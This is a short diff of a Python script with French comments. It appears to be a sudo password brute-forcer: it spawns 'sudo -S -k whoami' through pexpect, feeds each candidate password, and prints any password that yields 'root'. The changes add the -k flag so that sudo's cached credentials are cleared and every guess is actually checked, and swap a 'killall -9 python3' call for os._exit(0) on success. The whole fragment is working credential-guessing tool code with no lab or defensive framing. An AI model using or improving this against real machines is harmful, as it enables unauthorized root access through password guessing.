@@ -9,14 +9,14 @@ def test_password(pw, index):
     try:
         # Lance un processus sudo avec pexpect
 #        child = pexpect.spawn("sudo -S su -c 'whoami'", encoding="utf-8")
-        child = pexpect.spawn("sudo -S whoami", encoding="utf-8")
+        child = pexpect.spawn("sudo -S -k whoami", encoding="utf-8")
         # Envoie le mot de passe
         child.sendline(pw)
         # Attendre la sortie de la commande
         child.expect([pexpect.TIMEOUT, "root", pexpect.EOF], timeout=0.035)
         if child.after == "root":
             print(f"✅ Mot de passe : {pw}")
-            os.execvp("killall", ["killall", "-9", "python3"])
+            os._exit(0)
     except:
         return None
 
